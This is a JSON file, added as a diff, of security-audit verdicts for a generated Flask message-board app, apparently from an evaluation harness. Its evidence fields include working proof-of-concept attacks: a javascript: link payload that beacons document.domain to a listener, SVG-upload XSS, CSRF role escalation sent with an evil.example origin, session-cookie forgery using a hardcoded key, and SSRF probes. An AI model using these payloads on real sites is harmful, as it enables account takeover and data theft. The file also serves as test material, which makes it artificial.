@@ -1,0 +1,145 @@
+{
+ "app": "gen-1",
+ "verdicts": {
+  "access_control_admin": {
+   "verdict": "SAFE",
+   "evidence": "is_admin_required() re-reads users.is_admin from DB. anon and normal user bob: GET /admin -> 403, GET /admin/users -> 403 {error: admin only}; admin alice -> 200. (Reachable only via session forgery, reported separately.)",
+   "confidence": "high"
+  },
+  "admin_user_mgmt": {
+   "verdict": "SAFE",
+   "evidence": "bob: POST /admin/users/3/role {role:admin} -> 403; DELETE /admin/users/3 -> 403; anon role change -> 403. Admin positive control works.",
+   "confidence": "high"
+  },
+  "privilege_escalation": {
+   "verdict": "SAFE",
+   "evidence": "POST /signup JSON {..., is_admin:1, role:'admin'} -> 201 {is_admin:false}; form is_admin=1 -> is_admin 0. INSERT uses server-computed is_admin (1 only if users table empty). No profile endpoint accepts role.",
+   "confidence": "high"
+  },
+  "idor_profile": {
+   "verdict": "SAFE",
+   "evidence": "bob and anon GET /users/1 (HTML, and with Accept: application/json -> still HTML) contain no phone; phone rendered only if viewer id == profile id (bob sees own 01022222222). /admin/users (phones) is admin-only.",
+   "confidence": "high"
+  },
+  "bola_objects": {
+   "verdict": "SAFE",
+   "evidence": "bob on alice's post 1: PATCH /posts/1 -> HTTP 200 but body {error:forbidden} and no change (status-code bug: JSON branch of the 403 path omits the status); DELETE /posts/1 -> 403; PATCH/DELETE /comments/1 -> 403. Post and comment intact afterwards.",
+   "confidence": "high"
+  },
+  "csrf_protection": {
+   "verdict": "VULNERABLE",
+   "evidence": "No CSRF token anywhere, no Origin/Referer check, endpoints accept application/x-www-form-urlencoded, and Set-Cookie is 'session=...; HttpOnly; Path=/' (no SameSite). Live as admin alice with Origin/Referer http://evil.example, form-encoded body: POST /admin/users/2/role role=admin -> 200 {is_admin:true} and bob then gets 200 on /admin; POST /posts title=csrf -> 201; POST /profile/avatar avatar_url=... -> 200. Browser: Firefox/Safari send the SameSite-less cookie on a cross-site form POST; Chrome only within ~2 min of login (Lax-by-default + POST exception). Not run in a real cross-site browser page. /account/password needs old_password (not CSRF-able); DELETE endpoints are not form-able.",
+   "confidence": "high"
+  },
+  "stored_xss": {
+   "verdict": "VULNERABLE",
+   "evidence": "Text sinks are autoescaped (title/content/comment/username payload <script>alert(1)</script><img src=x onerror=alert(2)> rendered as &lt;script&gt;...). BUT link_url is stored verbatim with no scheme check (fetch_link_preview returns link_url even for non-http) and rendered as <a href=\"{{ post.link_url }}\"> with no CSP. PoC: POST /posts {title,content,link_url:'javascript:new Image().src=\"http://127.0.0.1:18691/g1-jslink-xss-executed?d=\"+document.domain;void 0'} -> /posts/13 renders <a href=\"javascript:...\">; clicking it in Chromium 152 -> listener hit /g1-jslink-xss-executed?d=127.0.0.1 (script ran on app origin). Needs one click. (SVG-upload XSS is reported under unrestricted_upload.)",
+   "confidence": "high"
+  },
+  "reflected_xss": {
+   "verdict": "SAFE",
+   "evidence": "GET /search?q=<script>alert(1)</script> and q=\"><svg onload=alert(1)> -> escaped in both the value=\"\" attribute and text (&#34;&gt;&lt;svg...). No other reflected params.",
+   "confidence": "high"
+  },
+  "unrestricted_upload": {
+   "verdict": "VULNERABLE",
+   "evidence": "ALLOWED_EXT includes 'svg'. POST /posts multipart image=p.svg containing <script> -> /static/uploads/post_<uuid>.svg served 200 'image/svg+xml; charset=utf-8', Content-Disposition inline, no CSP/nosniff. Opening that URL in Chromium 152 executed the script (documentElement data-pwned=1 and listener hit /g1-svg-xss-executed?origin=127.0.0.1) = same-origin stored XSS. Also via POST /profile/avatar image=a.svg -> 200. .html and x.svg.html rejected; filename '../../templates/base.png' -> uuid name inside uploads (traversal SAFE).",
+   "confidence": "high"
+  },
+  "sqli": {
+   "verdict": "SAFE",
+   "evidence": "All values parameterized; sort mapped via fixed dict .get(). sqlmap --level 3 --risk 2 on GET /search (q, sort) and --level 2 on POST /login JSON (username, password, --ignore-code 401) -> not injectable. Manual: login \"' OR '1'='1\" / \"alice' --\" -> 401; sort='(SELECT 1)' -> default order.",
+   "confidence": "high"
+  },
+  "ssrf": {
+   "verdict": "VULNERABLE",
+   "evidence": "fetch_link_preview() only checks the http/https prefix. POST /posts link_url=http://host.docker.internal:18691/g1-preview -> host listener hit (UA Mozilla/5.0) and post shows title 'SSRF-CANARY-TITLE' / summary 'ssrf canary summary' (full read-back). link_url=http://127.0.0.1:5000/posts -> preview title 'Flask Board' (loopback reachable). 169.254.169.254 -> nothing (no metadata service in sandbox). avatar_url is stored only, never fetched (no hit).",
+   "confidence": "high"
+  },
+  "session_forgery": {
+   "verdict": "VULNERABLE",
+   "evidence": "app.secret_key = 'flask-board-secret-key' (hardcoded, low-entropy, guessable). Forged cookie with itsdangerous/Flask SecureCookieSessionInterface: {\"user_id\":1,\"username\":\"alice\",\"is_admin\":true} -> eyJ1c2VyX2lkIjoxLC... ; with NO login, GET /admin/users -> 200 listing every user's phone (01011111111, 01022222222, ...); POST /admin/users/4/role {role:admin} -> 200 {\"is_admin\":true}. Control: same payload signed with key 'wrong' -> 403. current_user() trusts session['user_id'], so forging user_id=1 = full admin takeover.",
+   "confidence": "high"
+  },
+  "hardcoded_secret": {
+   "verdict": "VULNERABLE",
+   "evidence": "app.secret_key = 'flask-board-secret-key' (hardcoded, low-entropy, guessable). Forged cookie with itsdangerous/Flask SecureCookieSessionInterface: {\"user_id\":1,\"username\":\"alice\",\"is_admin\":true} -> eyJ1c2VyX2lkIjoxLC... ; with NO login, GET /admin/users -> 200 listing every user's phone (01011111111, 01022222222, ...); POST /admin/users/4/role {role:admin} -> 200 {\"is_admin\":true}. Control: same payload signed with key 'wrong' -> 403. current_user() trusts session['user_id'], so forging user_id=1 = full admin takeover.",
+   "confidence": "high"
+  },
+  "weak_default_secret": {
+   "verdict": "N/A",
+   "confidence": "high",
+   "evidence": "환경변수 폴백 없이 리터럴을 직접 대입(app.secret_key='flask-board-secret-key') → hardcoded_secret 항목에서 판정(위조 실증). weak_default_secret 은 os.environ.get(..., '<리터럴>') 폴백 정의라 해당 없음."
+  },
+  "debug_true": {
+   "verdict": "SAFE",
+   "evidence": "app.run(debug=False). GET /console -> 404. A forced 500 shows the generic Werkzeug page with no traceback.",
+   "confidence": "high"
+  },
+  "verbose_errors": {
+   "verdict": "SAFE",
+   "evidence": "POST /login with JSON body [1,2] -> 500 generic 'Internal Server Error' page, no traceback/paths. 404s are generic. (The Server header shows Werkzeug/3.1.9 Python/3.11.17, which is minor.)",
+   "confidence": "high"
+  },
+  "password_hashing": {
+   "verdict": "SAFE",
+   "evidence": "DB in container: password = 'scrypt:32768:8:1$...' (werkzeug generate_password_hash default).",
+   "confidence": "high"
+  },
+  "rate_limiting": {
+   "verdict": "VULNERABLE",
+   "evidence": "40 consecutive wrong-password POST /login for alice -> all 401 (no 429/lockout/delay); correct password immediately after -> 200.",
+   "confidence": "high"
+  },
+  "weak_password_policy": {
+   "verdict": "VULNERABLE",
+   "evidence": "POST /signup password '1' -> 201 (also 'b', 'c'). No length/complexity check.",
+   "confidence": "high"
+  },
+  "auth_session_management": {
+   "verdict": "VULNERABLE",
+   "evidence": "Password change requires old password (missing -> 400, wrong -> 403) = OK. But logout is only session.clear() on Flask's client-side signed cookie: replaying bob's pre-logout cookie after POST /logout -> own phone visible and POST /posts -> 201. Sessions also survive a password change (other cookie still valid). Framework-default behaviour; same in all 3 apps.",
+   "confidence": "high"
+  },
+  "cookie_flags": {
+   "verdict": "VULNERABLE",
+   "evidence": "Set-Cookie: session=...; HttpOnly; Path=/ - no SameSite, no Secure (Flask defaults). The missing SameSite is what makes the CSRF above work.",
+   "confidence": "high"
+  },
+  "security_headers": {
+   "verdict": "VULNERABLE",
+   "evidence": "No X-Frame-Options, X-Content-Type-Options, Referrer-Policy, CSP or HSTS on any response (only Server/Date/Content-Type/Vary).",
+   "confidence": "high"
+  },
+  "csp": {
+   "verdict": "VULNERABLE",
+   "evidence": "No Content-Security-Policy header; the javascript: link and SVG XSS both executed.",
+   "confidence": "high"
+  },
+  "transport_security": {
+   "verdict": "VULNERABLE",
+   "evidence": "Plain HTTP, no Strict-Transport-Security, cookie lacks Secure. Depends on deployment: the grader runs plain HTTP.",
+   "confidence": "medium"
+  },
+  "insecure_deserialization": {
+   "verdict": "SAFE",
+   "evidence": "No pickle/yaml/marshal/eval/exec/subprocess/os.system/render_template_string in app.py (grep). Flask session uses the JSON tagged serializer.",
+   "confidence": "high"
+  },
+  "other": {
+   "verdict": "SAFE",
+   "evidence": "No seeded/hardcoded user credentials (DB starts empty; first signup becomes admin per the contract). No open redirect (only redirect('/posts')). Static serving goes through Flask safe_join (no traversal). avatar_url accepts any string (javascript:, external tracking URL) into <img src>: inert in modern browsers. Login CSRF is also possible but is subsumed by csrf_protection VULNERABLE.",
+   "confidence": "medium"
+  },
+  "functional": {
+   "verdict": "SAFE",
+   "evidence": "Works (SAFE = functional OK). JSON signup 201 + auto-login, first user admin; login 200; POST /posts multipart with image -> 201; comment 201; detail keeps newlines + shows comment; search + sort newest/oldest/title 200. Caveats: GET /login and GET /signup -> 405 (no form pages; forms only appear on other pages); admin_users.html delete form POSTs to a DELETE-only route (405).",
+   "confidence": "high"
+  },
+  "default_credentials": {
+   "verdict": "SAFE",
+   "confidence": "high",
+   "evidence": "init_db 에 기본 관리자 계정 시드 없음(첫 가입자가 관리자) — 코드 확인"
+  }
+ }
+}
